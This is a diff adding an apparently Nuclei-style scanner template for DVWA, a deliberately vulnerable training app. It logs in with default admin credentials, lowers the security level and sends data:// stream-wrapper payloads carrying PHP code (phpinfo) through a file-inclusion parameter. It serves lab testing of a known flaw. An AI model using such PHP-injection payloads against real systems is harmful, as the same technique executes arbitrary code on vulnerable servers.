@@ -1,0 +1,77 @@
+id: web-php-stream-medium-sec
+
+info:
+  name: Web PHP Stream Medium Sec (Authenticated)
+  author: Dylan Shield (Shieldia.co)
+  severity: info
+  description: Tests for other PHP Streams like data://
+  tags: dvwa,rfi
+
+variables:
+  password: "password"
+  username: "admin"
+
+flow: |
+  http(1) && http(2)
+  http(3);
+  
+
+http:
+  # Step 1: Authenticate as admin and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        username={{username}}&password={{password}}&Login=Login&user_token={{token}}
+    
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+
+  # Step 2: Set Security Level to Medium
+  - raw:
+      - |
+        POST /DVWA/security.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        security=medium&seclev_submit=Submit&user_token={{token}}
+
+  # Step 3: Test the rfi
+  - raw:
+    - |
+        GET /DVWA/vulnerabilities/fi/?page=§commands§ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+    attack: batteringram
+    payloads:
+      commands:
+        - 'data://text/plain,%3C?php%20phpinfo();%20?%3E'
+        - 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
+    matchers:
+      - type: dsl
+        name: "Successful PHP Stream"
+        condition: and
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "PHP Version")'
+
